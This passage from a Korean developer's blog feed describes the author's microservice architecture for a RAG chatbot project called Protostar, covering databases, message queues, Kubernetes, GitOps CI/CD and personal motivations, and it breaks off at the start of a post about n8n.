<p>나의 목표는 그렇다. 이 프로젝트의 성공적인 런칭을 통해 사업을 하거나 하는건 당장은 힘드리라 생각한다. 그러나 몸의 회복을 하는 6개월의 시간을 이를 하면서 보냄으로서 다음을 철저히 준비하고, 무엇보다 ‘연차’나 ‘비개발직군’이 가지는 한계치를 뛰어넘는 역량을 증명해 내는 것. 그것이 본 프로젝트를 하는 목표의 한 축이라 할 수 있겠다. (물론, 위에서 언급한 불편함을 ‘나’에게 적용시켜서 스스로의 아쉬운 포인트를 긁어내고 싶은 점도 있긴 하다.)</p>

<h3 id="디테일하게-아키텍처의-진화-문제해결을-위한-구조-탐구">디테일하게 아키텍처의 진화, 문제해결을 위한 구조 탐구</h3>

<p>위에서 언급한 v1 ~ v2.1 은 내 목표를 달성하기 위한 ‘실전 구현’의 목표보다는 ‘기술검증’을 위한 도구에 가깝다. 실제로 n8n 을 테스팅 하면서 AI의 구축이나 서버의 구축은 사실 모놀리스식, 가장 빠르고 쉬운 접근법이 구현이란 차원에서 보면 맞을 수 있었다.</p>

<p>하지만 목표가 있기에, 그걸 위한 구조를 짜보면서 정말 많은 공부를 했기에 얻어낸 결실이었다.</p>

<p>최초 버전에서 한계점이 보였다. Java Spring 에 대한 작업을 안 해본건 아니지만, 너무 오래 되었기에 다시 보겠다는 점, 특히 WebFlux처럼 NestJS에선 당연한 도구지만 비동기, 비봉쇄의 이벤트 루프 방식의 처리를 통해 Java 진영 역시 빠르고 안정적인 단일 프로세스 기반의 비동기 처리가 가능해졌다. 이를 이해할 필요는 있어 보였다.</p>

<p>또한 k8s를 단순히 CLI로 쓰는 건 매우 어렵고 복잡한 일이었다. 특히 패키지 매니징을 통해 실무에서 검증된 기술을 쓴다는 점에서 생각하면 생성되는 수십개의 노드들의 관계나 디테일을 관리하기란 생각 이상으로 어려웠고, 이를 위한 도구가 ArgoCD라는 것을 이해했을 때, 도입과 함께 CD의 기틀을 GitOps로 가야 함을 깨달았다.</p>

<p>특히, 구조 상 폴리레포 형태를 포함해야하고, Git repo를 단일한 공급원으로 삼아 CI의 구성 효율화가 필요함, 원본 정보를 RAG 하기 전 상태로 유지해야 한다는 점등을 볼 때, MinIO의 필요성 등을 느꼈다.</p>

<p>특히나 가장 문제점은 홈랩(Homelab)을 구축하였고, 이를 기반으로 한 서비스 배포를 생각해보고 있는데, 공인 IP 한대로는 한개의 종단간 암호화 인증 및 서비스 배포가 되기 때문에, 간단히 생각해 443 포트를 가상 도메인 방식으로 Admin, Servce 모두 연결 시킬 순 있지만. 그렇게 했다간 Service 의 과부하 일 경우 Admin 접속이 불가능하다는 문제를 파악. 이를 개선하는 것을 포함하기 위해 GCP 프리티어의 인스턴스를 활용 L4 레이어 TLS passthrough 를 도입하는 등의 변화를 겪었다.</p>

<p>이러한 v2의 변화 이후엔, 더욱이 기존의 NextJS기반의 프론트엔드 작업, Jenkins 기반으로 먼저 올려두었던 프론트엔드 구축과 k8s 기반으로 동작한 백엔드 사의 문제점을 파악. 이를 고려한 통합 체계 구축이 필요했고, 특히나 최신 표전 Gateway API 사용이 필요하다는 점, 보안 운영 자동화 등을 고려하여 얻은 최종 결과 아키첵처가 v2.1 로 정리 되었다.  그리하여 간단하게 정리한, 그리고 각 구성은 다음과 같이 정리 된다.</p>

<hr />

<h4 id="v21-최종-아키텍처">v2.1 최종 아키텍처</h4>

<table>
  <thead>
    <tr>
      <th>저장소</th>
      <th>역할</th>
      <th>저장 데이터</th>
      <th>위치</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>**PostgreSQL**</td>
      <td>서비스 저장용, JSONB 기능으로 MongoDB 역할 포함</td>
      <td> </td>
      <td>A5</td>
    </tr>
    <tr>
      <td>**PostgreSQL - pgvector**</td>
      <td>AI를 위한 RAG 용</td>
      <td> </td>
      <td>A5</td>
    </tr>
    <tr>
      <td>**MinIO**</td>
      <td>ObjectStorage(S3호환)</td>
      <td>원본 파일 저장용, HTML 백업 등</td>
      <td>Centre</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>개선 이유
    <ol>
      <li>현재의 온프레미스 상황에서 리소스의 분산은 효과적이지 못하고, 트래픽 대응에서 비효율적이다. (한 서버내에서 동작해야 하는 병목을 고려시)</li>
      <li>PostgreSQL 은 기본 VectorDB 기능을 포함하고 있기 때문에 RAG 데이터와 임베딩 벡터를 단일 트랜잭션으로 관리할 수 있게 되며, 이는 데이터 정합성, 일관성을 보장할 수 있게 만든다. 두개의 DB 를 별도 운영시 생기는 복잡한 동기화 문제를 원천적으로 제거하는 역할을 함.</li>
      <li>MinIO 는 RAG를 위한 원본데이터들의 보존, 외부 서비스(AWS 등)와 호환성 유지를 위한 도구로 사용함</li>
    </ol>
  </li>
  <li>ORM
    <ul>
      <li><strong>NestJS (Prisma):</strong> 익숙한 스택으로 <strong>개발 속도</strong> 확보</li>
      <li><strong>Spring (R2DBC):</strong> 새로운 논블로킹 스택 호환성을 위해,  <strong>기술 깊이</strong> 확보</li>
      <li><strong>FastAPI (SQLModel):</strong> 파이썬 네이티브 스택으로 <strong>AI/RAG 연동성</strong> 확보</li>
    </ul>
  </li>
  <li>MSA 서버 구성</li>
</ul>

<table>
  <thead>
    <tr>
      <th>서버명</th>
      <th>주요 역할</th>
      <th>내장 서비스</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>**Auth 서버**</td>
      <td>인증/인가, JWT 토큰 관리</td>
      <td> </td>
    </tr>
    <tr>
      <td>**User 서버**</td>
      <td>사용자 프로필 및 권한 관리</td>
      <td>• 기본 유저 서비스<br />• 별지기 서비스<br />• 샛별 서비스</td>
    </tr>
    <tr>
      <td>**Chat 서버**</td>
      <td>대화 및 커리어 데이터 관리</td>
      <td>• Chat 서비스<br />• ActiveStatics 서비스<br />• Content 서비스</td>
    </tr>
    <tr>
      <td>**AI 서버**</td>
      <td>LLM 호출 및 RAG 처리, FastAPI 기반</td>
      <td>• RAG 서비스<br />• Crawling AI 서비스 (요약)</td>
    </tr>
    <tr>
      <td>**Noti 서버**</td>
      <td>알림 발송</td>
      <td>• Discord Webhook<br />• Email</td>
    </tr>
    <tr>
      <td>**Logging 서버**</td>
      <td>로그 수집 및 파일 저장</td>
      <td>• 내장 Message Queue<br />• 파일 관리</td>
    </tr>
    <tr>
      <td>**Schedule 서버**</td>
      <td>배치 작업 오케스트레이션</td>
      <td> </td>
    </tr>
    <tr>
      <td>**Psychological 서버**</td>
      <td>선행 서비스로, 심리 테스트 서비스 구현용</td>
      <td>- 답변 저장<br />- 답변 호출<br />- AI 서비스에 판단 요청</td>
    </tr>
    <tr>
      <td>**API Gateway**</td>
      <td>모든 통신의 출입구 역할. 가장 먼저 대응하는 서버</td>
      <td> </td>
    </tr>
    <tr>
      <td>**Redis 서버**</td>
      <td>캐싱 전략용</td>
      <td> </td>
    </tr>
    <tr>
      <td>**RabbitMQ**</td>
      <td>메시지 전략용 서비스</td>
      <td> </td>
    </tr>
    <tr>
      <td>**Loki**</td>
      <td>stdout 로그를 수신하고, Grafana 로 전달 역할</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h5 id="서버별-책임-및-설계-결정">서버별 책임 및 설계 결정</h5>

<ul>
  <li>API Gateway
    <ul>
      <li>==Spring Cloud Gateway==</li>
      <li>모든 API 를 마주하는 공간. 여길 통해 접근이 되며, 최초의 트래픽의 대응 역할을 수행하여서 내부 서비스들을 보호하고 동시에 조절 관리한다.</li>
      <li>특정 사용 제한 사항이 있다면, 이에 대한 조절, 통제 역할</li>
      <li>서비스를 위한 전역 관리 사항들에 대해 통제하고, 문제 발생시 조절하는 브레이커 역할기(서비스들 보호 및 로직 단순화를 위한 용도)</li>
      <li><strong>기술 스택: <code class="language-plaintext highlighter-rouge">Auth 서버</code>와 동일한 Spring WebFlux(논블로킹) 스택을 사용하여, v2 기술 목표(Spring 경험) 및 아키텍처 기술 일관성 확보.</strong></li>
      <li><strong>중앙 집중형 제어: 인증/인가, 사용량 제한(Rate Limiting), 서킷 브레이커(Circuit Breaker) 역할을 전담하여 백엔드 서비스들의 비즈니스 로직을 단순화.</strong></li>
      <li><strong>성능 및 안정성: 비동기 논블로킹 스택으로 대규모 동시 트래픽을 효율적으로 처리하고, 장애 격리를 통해 시스템 전체 안정성 보장.</strong></li>
    </ul>
  </li>
  <li>Auth 서버
    <ul>
      <li>==Spring WebFlux + R2DBC==</li>
      <li>JWT 발급/검증, 리프레시 토큰 관리</li>
      <li>다른 서비스와 분리하여 보안 계층 독립성 확보</li>
      <li><strong>기술 스택: v2 핵심 목표인 ‘Spring 비동기 논블로킹’ 스택 경험을 위해 선정.</strong></li>
      <li><strong>도메인 적합성: 인증/인가는 I/O(DB 조회)가 잦지만 로직이 비교적 고립되어 있어, WebFlux의 성능 이점 테스트 및 새 스택 적용에 가장 안정적인 도메인.</strong></li>
      <li><strong>R2DBC: WebFlux의 논블로킹 철학을 DB까지 일관되게 유지하기 위해, 블로킹(Blocking) 방식의 JPA 대신 반응형(Reactive) DB 접근 기술인 R2DBC 채택.</strong></li>
    </ul>
  </li>
  <li>User 서버
    <ul>
      <li><strong>통합 이유:</strong>
        <ul>
          <li>별지기/샛별은 역할(Role)이며 완전히 다른 도메인이 아님</li>
          <li>하나의 계정이 두 역할을 동시 보유 가능 (샛별 = 별지기 + 샛별 기능)</li>
          <li>초대 코드 기반 소규모 사용자로 병목 없음</li>
          <li>PostgreSQL 단일 트랜잭션으로 권한 변경 관리 단순화</li>
        </ul>
      </li>
      <li>
        <p><strong>권한 체계:</strong></p>

        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  guest → 회원가입 → stargazer → 초대코드 입력 → protostar
  (질문 3회)         (질문 10회/일)              (모든 기능 사용)
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>Chat 서버
    <ul>
      <li><strong>Content 서비스 통합 이유:</strong>
        <ul>
          <li>초기 단계에서는 Content가 Chat 도메인과 밀접 (대화를 위한 자료)</li>
          <li>장기적으로 비대해지면 독립 서버로 분리 가능하도록 모듈화</li>
        </ul>
      </li>
      <li><strong>책임:</strong>
        <ul>
          <li>대화 저장/조회</li>
          <li>질문 횟수 제한 체크</li>
          <li>피드백 관리</li>
          <li>통계 생성 (ActiveStatics)</li>
          <li>커리어 데이터 업로드/관리 (Content)</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>AI 서버
    <ul>
      <li>==FastAPI 서버==
        <ul>
          <li>Python 생태계가 LLM 통합에 유리</li>
          <li>Gemini API 사용으로 로컬 추론 부하 없음 (512MB-1GB 수준)</li>
          <li>Claude API로 전환 가능하도록 추상화 계층 구현 예정</li>
        </ul>
      </li>
      <li><strong>RabbitMQ 적용 (RAG 파이프라인): <code class="language-plaintext highlighter-rouge">Chat 서버</code>의 파일 업로드(빠른 응답)와 <code class="language-plaintext highlighter-rouge">AI 서버</code>의 임베딩 처리(느린 작업)를 비동기 큐로 완벽하게 분리(Decoupling). NestJS(Publisher)와 FastAPI(Consumer) 이종 스택 간의 안정적인 교차 통신 구현.</strong></li>
    </ul>
  </li>
  <li>Noti 서버
    <ul>
      <li>==RabbitMQ== 적용으로 메시지를 구독하고, 각종 서비스에서 이벤트를 발행 이를 수신한다</li>
      <li>Dicord 알림이나, 이메일을 알림, 비밀번호 찾기 등의 보내기를 관리하는 서버</li>
      <li><strong>RabbitMQ 적용 (이벤트 기반 디커플링): 타 서비스(Chat, User)가 발행(Publish)한 이벤트를 구독(Subscribe)하여 처리. 알림 API(Discord/Email)의 지연/장애가 원본 서비스에 영향을 주지 않도록 완벽히 격리.</strong></li>
    </ul>
  </li>
  <li>Logging 서버
    <ul>
      <li>==RabbitMQ== 적용으로 메시지르 구독하고 수신한다.</li>
      <li>각 서버는 Logging 서비스에 로그 전송 후 무시 (fire-and-forget)</li>
      <li>
        <p>파일 저장이 핵심 역할 (장기 보관, 감사 로그)</p>
      </li>
      <li><strong>이중화 전략:</strong>
        <ul>
          <li><strong>Loki (실시간 디버깅용): 각 서버 <code class="language-plaintext highlighter-rouge">stdout</code> (표준 출력)을 Loki가 수집, Grafana에서 실시간 스트리밍 및 필터링. (영구 보관 목적 아님)</strong></li>
          <li><strong>RabbitMQ -&gt; Files (영구 감사용): 서비스가 직접 발행하는 비즈니스 중요 로그(감사, 중요 에러)를 MQ를 통해 유실 없이 수신, <code class="language-plaintext highlighter-rouge">Logging 서버</code>가 구독하여 파일로 영구 저장. (장기 보관 및 감사 추적 목적)</strong>
            <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  각 서버
├→ stdout (표준 출력) → Loki → Grafana (실시간 조회)
└→ RabbitMQ 로 전달 -&gt; Logging 서버 → Files (영구 보관)
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Schedule 서버
    <ul>
      <li><strong>오케스트레이터 역할 선택 이유:</strong>
        <ul>
          <li>배치 작업의 가시성과 제어권 중앙 집중화를 위한 전략</li>
          <li>“누가 언제 무엇을 실행하는가” 한눈에 파악 가능</li>
          <li>각 서버는 비즈니스 로직을 소유, 스케줄만 Schedule 서버가 트리거</li>
          <li>반복작업의 증대 및 복잡도 증가로 각 서버가 책임을 다해야할 시 해당 서버로 스케줄 이관 가능 (유연성 확보)</li>
          <li>단 필요한 기능이 있을 때만 쓸 것이므로 일단 기획만 해줄 것</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h5 id="프론트엔드">프론트엔드</h5>
<ul>
  <li>프론트엔드 구성은 3가지로 구성됨
    <ol>
      <li>기술블로그에 올라가는 정적인 챗봇 컴포넌트</li>
      <li>챗봇 컴포넌트에서 시작하여 SSR로 동작하는 챗봇 내부 UI 컴포넌트(SPA)</li>
      <li>챗봇 설정을 위한 대시보드</li>
    </ol>
  </li>
  <li>미니 프로젝트(테스트 프로젝트)
    <ul>
      <li>심리 테스트를 AI 로 돌리는 것을 수행할 예정</li>
      <li>간단한 UX 로 구현 + AI 이미지 에셋으로 완성시키기</li>
      <li>gpt-oss-120b 모델을 활용하여 API 사용 비용을 최소화 시킬 예정</li>
      <li>Big-Five 심리 테스트 방법론 + 판타지, SF 등을 활용해 재미있는 네러티브 테스트</li>
      <li>회원가입 기능(간단 이메일, 알림 전달 용, 유저의 기록 저장및 검색용)</li>
    </ul>
  </li>
</ul>

<h5 id="msa-아키텍쳐-및-통신-방법">MSA 아키텍쳐 및 통신 방법</h5>

<ul>
  <li>k8s 를 사용하고, 내부에 대한 DNS 처리가 용이한 만큼, 내부에서 동작하는 DNS url 기반으로 동작하게 만들 것이다. 단 이때, 비동기적으로 동작해야 하는 경우, 혹은 FAF(Fire and Forget) 방식으로 마이크로 서비스로 전달해도 되는 것에 대해서는 RabbitMQ를 기반으로 하는 메시지 방식을 접목한다.</li>
</ul>

<ol>
  <li>동기식 통신 (Synchronous): HTTP
    <ul>
      <li><strong>“질문/응답(Request/Response)”</strong> 방식의 통신으로, 요청자는 응답을 받을 때까지 기다린다. API Gateway, Auth 서버, User 서버 간의 정보 조회 등 즉각적인 응답이 필수적인 모든 곳에서 HTTP를 사용한다.</li>
    </ul>
    <ul>
      <li><strong>외부 진입 (External):</strong>
        <ul>
          <li>모든 외부 클라이언트 트래픽은 <strong><code class="language-plaintext highlighter-rouge">Host Nginx</code></strong>를 통해 <strong><code class="language-plaintext highlighter-rouge">API Gateway</code></strong>로 진입한다.</li>
          <li><code class="language-plaintext highlighter-rouge">API Gateway</code>는 인증/인가(<code class="language-plaintext highlighter-rouge">Auth 서버</code> 호출), 사용량 제한 등 공통 정책을 중앙에서 처리한다.</li>
        </ul>
      </li>
      <li><strong>내부 통신 (Internal):</strong>
        <ul>
          <li><strong>“정책 A: 내부 간 직접 호출 허용”</strong>을 채택한다.</li>
          <li>서비스 간(예: <code class="language-plaintext highlighter-rouge">User 서버</code> -&gt; <code class="language-plaintext highlighter-rouge">Chat 서버</code>)의 동기 호출은 <code class="language-plaintext highlighter-rouge">API Gateway</code>를 거치지 않고, <strong>k8s 내부 네트워크(Service Discovery, 예: <code class="language-plaintext highlighter-rouge">http://chat-service</code>)</strong>를 통해 직접 통신한다.</li>
          <li><strong>근거:</strong> 게이트웨이를 우회하여 내부 통신 성능(Low Latency)을 극대화하고, <code class="language-plaintext highlighter-rouge">API Gateway</code>의 부하를 줄인다.</li>
          <li><strong>v2 경험:</strong> 이 정책은 <code class="language-plaintext highlighter-rouge">User 서버</code>와 같은 호출자(Caller)가 <code class="language-plaintext highlighter-rouge">Chat 서버</code>의 장애에 대비한 <strong>서킷 브레이커(Circuit Breaker)</strong> 및 <strong>재시도(Retry)</strong> 로직을 직접 구현해야 함을 의미하며, 이는 v2의 핵심 경험 목표와 일치한다.</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<hr />

<ol>
  <li>비동기식 통신 (Asynchronous): RabbitMQ
    <ul>
      <li><strong>“발행/구독(Publish/Subscribe)”</strong> 방식의 통신으로, 요청자는 작업을 “명령”하고 즉시 응답을 받는다(Fire-and-Forget). 서비스 간의 결합도를 완벽히 분리(Decoupling)하고 장애가 전파되는 것을 막기 위해 사용한다.</li>
    </ul>
    <ul>
      <li><strong>RAG 처리 파이프라인 (교차 스택 통신):</strong>
        <ul>
          <li><strong>흐름:</strong> <code class="language-plaintext highlighter-rouge">Chat 서버</code> (NestJS) -&gt; <strong>RabbitMQ</strong> -&gt; <code class="language-plaintext highlighter-rouge">AI 서버</code> (FastAPI)</li>
          <li><strong>목적:</strong> 사용자의 빠른 파일 업로드(HTTP 응답)와 시간이 오래 걸리는 AI 임베딩 처리(MQ 작업)를 완벽하게 분리한다.</li>
        </ul>
      </li>
      <li><strong>비동기 알림:</strong>
        <ul>
          <li><strong>흐름:</strong> <code class="language-plaintext highlighter-rouge">Chat 서버</code> / <code class="language-plaintext highlighter-rouge">User 서버</code> -&gt; <strong>RabbitMQ</strong> -&gt; <code class="language-plaintext highlighter-rouge">Noti 서버</code></li>
          <li><strong>목적:</strong> Discord/Email 등 외부 API의 지연이나 장애가 <code class="language-plaintext highlighter-rouge">Chat 서버</code>와 같은 핵심 서비스에 영향을 주지 않도록 격리한다.</li>
        </ul>
      </li>
      <li><strong>영구/감사 로그 수집:</strong>
        <ul>
          <li><strong>흐름:</strong> 모든 서비스 -&gt; <strong>RabbitMQ</strong> -&gt; <code class="language-plaintext highlighter-rouge">Logging 서버</code></li>
          <li><strong>목적:</strong> 실시간 디버깅용 <code class="language-plaintext highlighter-rouge">stdout</code> (Loki)과는 별개로, 비즈니스 중요 로그(감사, 중요 에러)를 유실 없이 <code class="language-plaintext highlighter-rouge">Logging 서버</code>에 안정적으로 전달하여 영구 보관(Files)한다.</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<ul>
  <li>k8s 관리 확정사항
    <ol>
      <li>Kubernetes 배포판: MicroK8s
        <ul>
          <li>A5(Main) 및 Centre(Sub) 서버의 Ubuntu 환경에 k8s 클러스터를 구축하기 위한 배포판으로 <strong>MicroK8s</strong>를 채택한다.</li>
          <li><strong>선택 근거:</strong>
            <ul>
              <li><code class="language-plaintext highlighter-rouge">microk8s enable &lt;addon&gt;</code> 명령어를 통해 Ingress, DNS, Prometheus 등 필수 애드온을 손쉽게 활성화할 수 있다.</li>
              <li>k3s와 달리 etcd 등 표준 Kubernetes 컴포넌트를 거의 그대로 사용하여, 향후 EKS, GKE 등 매니지드 서비스로의 이전에 필요한 경험적 일관성을 확보하는 데 유리하다.</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>게이트웨이 전략: 이중(Dual) 게이트웨이
        <ul>
          <li>인프라 레벨과 애플리케이션 레벨의 게이트웨이를 명확히 분리하여, 각자의 역할에 집중하는 현대적 아키텍처를 구성한다.</li>
          <li><strong>(1) 인프라 게이트웨이 (건물의 “정문”): <code class="language-plaintext highlighter-rouge">K8s Gateway API</code></strong>
      - <code class="language-plaintext highlighter-rouge">ingress-nginx</code>의 지원 종료(2026년 예정)에 대응하여, 차세대 표준인 <strong><code class="language-plaintext highlighter-rouge">Gateway API</code></strong>를 도입한다. Nginx Gateway Fabric(NGF) 등 <code class="language-plaintext highlighter-rouge">Gateway API</code> 표준 구현체를 사용한다.
      - <strong>역할:</strong> SSL/TLS 인증서 처리, 도메인/경로 기반 라우팅(예: <code class="language-plaintext highlighter-rouge">api.my-domain.com</code> -&gt; <code class="language-plaintext highlighter-rouge">Spring Cloud Gateway</code>) 등 클러스터의 “북-남(North-South)” 트래픽을 담당한다.</li>
          <li><strong>(2) 애플리케이션 게이트웨이 (건물의 “안내 데스크”): <code class="language-plaintext highlighter-rouge">Spring Cloud Gateway</code></strong>
      - V2 기획안의 <code class="language-plaintext highlighter-rouge">API Gateway</code> 서버 역할을 그대로 수행한다.
      - <strong>역할:</strong> “정문”을 통과한 트래픽에 대해 JWT 인증/인가, 서비스별 사용량 제한(Rate Limiting), 서킷 브레이커, 비즈니스 로직 기반의 정교한 라우팅을 처리한다.</li>
        </ul>
      </li>
      <li>리포지토리 전략: GitOps를 위한 분리 모델
        <ul>
          <li>CI(Jenkins)와 CD(ArgoCD)의 역할을 명확히 분리하기 위해 리포지토리 유형을 3가지로 표준화한다.</li>
          <li><strong>(1) 템플릿 리포지토리 (<code class="language-plaintext highlighter-rouge">project-protostar-back</code>)</strong>
            <ul>
              <li>신규 마이크로서비스 생성 시 사용할 “설계 원본” 리포지토리이다.</li>
              <li>Spring, NestJS, FastAPI 등 스택별로 최적화된 <code class="language-plaintext highlighter-rouge">Dockerfile</code> 템플릿과 공통 <code class="language-plaintext highlighter-rouge">.gitignore</code>, <code class="language-plaintext highlighter-rouge">.prettierrc</code> 설정 등을 보관한다.</li>
              <li>이 리포는 CI/CD가 감시하지 않으며, 오직 개발자가 새 서비스 레포 생성 시에만 참조한다.</li>
            </ul>
          </li>
          <li><strong>(2) 애플리케이션 소스 리포지토리 (App Repos)</strong>
            <ul>
              <li><strong>명명 규칙:</strong> <code class="language-plaintext highlighter-rouge">project-protostar-{service-name}</code> (예: <code class="language-plaintext highlighter-rouge">project-protostar-auth-service</code>)</li>
              <li><strong>관리 방식:</strong> <strong>Polyrepo</strong>. 서비스별로 독립된 소스 코드 리포지토리를 가진다.</li>
              <li><strong>담당:</strong> <strong>Jenkins(CI)</strong>가 이 레포들을 감시한다.</li>
              <li><strong>구성:</strong> 실제 애플리케이션 소스 코드와, (1)번 템플릿에서 복사해 온 <strong>자신만의 <code class="language-plaintext highlighter-rouge">Dockerfile</code></strong>을 포함한다.</li>
            </ul>
          </li>
          <li><strong>(3) K8s 설정 리포지토리 (Config Repo)</strong>
            <ul>
              <li><strong>명명 규칙:</strong> <code class="language-plaintext highlighter-rouge">project-protostar-k8s-config</code></li>
              <li><strong>관리 방식:</strong> <strong>Monorepo</strong>. k8s 클러스터의 모든 상태를 정의하는 단일 리포지토리이다.</li>
              <li><strong>담당:</strong> <strong>ArgoCD(CD)</strong>가 오직 이 리포지토리만 감시한다.</li>
              <li><strong>구성:</strong>
                <ul>
                  <li>모든 App Repo 서비스의 <code class="language-plaintext highlighter-rouge">Deployment</code>, <code class="language-plaintext highlighter-rouge">Service</code>, <code class="language-plaintext highlighter-rouge">HTTPRoute</code> YAML.</li>
                  <li>k8s 클러스터 내부에 배포될 인프라(PostgreSQL, RabbitMQ, Redis)의 YAML .</li>
                </ul>
              </li>
              <li><strong>제외:</strong> Centre 서버에서 별도 운영되는 <code class="language-plaintext highlighter-rouge">MinIO</code> 관련 설정은 이 리포지토리에서 제외한다.</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>CI/CD 자동화 워크플로우
        <ul>
          <li><strong>(1) CI (Jenkins):</strong> <code class="language-plaintext highlighter-rouge">App Repo</code>의 코드 변경을 감지 -&gt; <code class="language-plaintext highlighter-rouge">Dockerfile</code>을 이용해 빌드 및 컨테이너 이미지 푸시 -&gt; <code class="language-plaintext highlighter-rouge">Config Repo</code>를 <code class="language-plaintext highlighter-rouge">clone</code>하여 해당 서비스의 <code class="language-plaintext highlighter-rouge">Deployment.yaml</code> 내 이미지 태그를 새 버전으로 수정한 뒤 <code class="language-plaintext highlighter-rouge">commit</code> &amp; <code class="language-plaintext highlighter-rouge">push</code>한다.</li>
          <li><strong>(2) CD (ArgoCD):</strong> <code class="language-plaintext highlighter-rouge">Config Repo</code>의 변경 사항(Jenkins가 푸시한 커밋)을 감지(<code class="language-plaintext highlighter-rouge">OutOfSync</code>) -&gt; k8s 클러스터로 변경 사항을 <code class="language-plaintext highlighter-rouge">pull</code>하여 배포(Sync)를 자동 수행한다.</li>
        </ul>
      </li>
    </ol>
  </li>
</ul>

<h3 id="혼자서-그리고-왜">혼자서, 그리고 왜?</h3>

<p><img src="/assets/images/posts/2025-11/20251124-040.png" alt="" /></p>
<blockquote>
  <p>2023년 300명 규모의 개발자 커뮤니티 행사 WASSSUP 당시, 실무진으로…</p>
</blockquote>

<p><img src="/assets/images/posts/2025-11/20251124-039.png" alt="" /></p>
<blockquote>
  <p>Peer 개발 총괄로 MT</p>
</blockquote>

<p><img src="/assets/images/posts/2025-11/20251124-041.png" alt="" /></p>
<blockquote>
  <p>Peer 개발 프로젝트가 처음인 신입들을 위한 Final Mission 행사</p>
</blockquote>

<p><img src="/assets/images/posts/2025-11/20251124-042.png" alt="" /></p>
<blockquote>
  <p>gemgem theraputics 팀 , 사업 확장 차 뉴욕 방문 당시</p>
</blockquote>

<p>3년 간 개발자로 살면서 정말 많은 일들이 있었다. 42서울에서는 동료 학습을 배웠고, 정신이 없었다. 
그러는 와중에도 Peer라는 귀한 이들을 만나, 개발자 다운 성장, 프로젝트의 어려움을 해결해보려고 노력했다. 그 과정에서 행사도 만들어보고, 개발도 해보고, 기획과 리딩도 해보면서 정말 많은 일들을 했고, 그 마지막에 1년이란 시간을 gemgem theraputics 에서 성장할 수 있는 기회를 얻었다.</p>

<p>다소 아쉬움도 있었다. 몸 건강을 잘 유지하지 못하고 고무줄 처럼 늘어난 몸무게(…)는 쉽지 않았고, 현재는 약 20kg 정도 감량하고, 더 감량하면서 이 프로젝트를 하고 있다.</p>

<p>누군가는 이렇게 이야기 했다. 돈 벌고, 모은 돈 써가며 왜 시간을 쓰냐. 그냥 이직해도 되지 않냐? 더 공부할 필요 뭐 있냐. 하면서 배우면 되지.</p>

<p>음, 틀린 말은 아니라고 생각한다. 
하지만 나의 인생, 많은 실패 속에서 얻어온 것들을 기반으로 얻은 내 생각은 조금, 다소 다르다.</p>

<p>돈도 중요하고, 경험도 중요하다. 무엇보다 중요한건 시대가 뭘 필요시 하냐? 에 대해 제대로 물을 줄 아는 태도와 제대로 답할 줄 아는 태도가 아닐까 싶다. AI가 등장하고 정말 편리한 개발이 되게 되었고, 개발 뿐 아니라 모든 영역이 그렇게가 가능해졌다. 하지만 그 결과 우리는 이제 엄청난 기술격차와 싸우게 되었고, 또 반대 급부로 어지간한 일은 다 할 수 있게 되었다.</p>

<p>문제는 도구를 어떻게 쓰냐, 어떤 철학, 방법론을 알고 있냐에 따라 AI 를 부리는 사람으로 평가 받을 수도 있고, 반대로 AI에게 부림 받는 경우를 맞이할 지도 모르겠다.</p>

<p>그러다보니 몸이 아프고, 쉼이 필요한 시점이자 동시에 이 프로젝트를 고안하고, 스스로의 힘으로 해결해보려고 하는 것은. 어쩌면 지금 나의 시대를 주체적으로 준비하고, 제대로 돈도 벌고, 제대로 기회도 얻고, 제대로 전문가의 그 길 위에 서기 위한 준비의 기간이라고, 자기 투자의 기간이라고 나는 생각한다.</p>

<p>그러니 1년 차지만, 3년차를 목표로 생각하며, 3년차는 경험하지 못할 AI의 가속도를 경험하고 싶다. 그것이 어쩌면 솔직한 내 상황이리라 싶다.</p>

<h3 id="결론-지평선-넘어를-보기-위해">결론, 지평선 넘어를 보기 위해</h3>

<p>기술적 복잡도, 기술적 구현해야할 양 많은 것이 사실이다. 
몰입해야 하고, 시간을 미친듯이 쏟아 넣고 있다. Obsidian에 온갖 AI 기반 프롬프트로 문제를 해결해나가고, n8n 기반으로 자동화된 소식통을 통해 현재의 ai 트랜드, 기술의 발전 경향을 탐독하고 있다.</p>

<p>Protostar는 만나는 구조적 문제들에 밤을 새어가면서 만들고 있는데, 덕분에 건강 챙기기는 약간 딜레이(?) 가 생여 신경 써야할 것 같다.</p>

<p>하지만 언덕 넘어를 보고 싶다는 마음 하나는 명확하다. Project Protostar는 이를 위한 한계를 뛰어넘는 발판이 되도록 만들고 싶으며, 만들고난 뒤엔 클로즈 테스트, 만약 잘되면 지속적인 서비스로 조그맣게 운영해볼 마음도 있다.</p>

<p>달리자.</p>]]></content><author><name>Paul2021-R</name></author><category term="학습" /><category term="Backend" /><category term="AI" /><category term="프로젝트" /><category term="DevOps" /><summary type="html"><![CDATA[Project Protostar 를 소개합니다]]></summary></entry><entry><title type="html">n8n 개념 정리하기</title><link href="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/09/01-introduction-n8n.html" rel="alternate" type="text/html" title="n8n 개념 정리하기" /><published>2025-11-09T00:00:00+00:00</published><updated>2025-11-09T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/09/01-introduction-n8n</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/09/01-introduction-n8n.html"><![CDATA[<h2 id="n8n-자동화-도구-소개">n8n 자동화 도구 소개</h2>

<p>이 글은 n8n이라는 자동화 도구에 대한 기본적인 개념을 정리한 내용이다. ‘심심풀이’ 프로젝트를 진행하며 n8n을 처음 접하는 개발자들에게 이 도구가 무엇이며, 어떤 핵심 개념을 가지고 있는지 명확히 전달하는 것이 목적이다.</p>

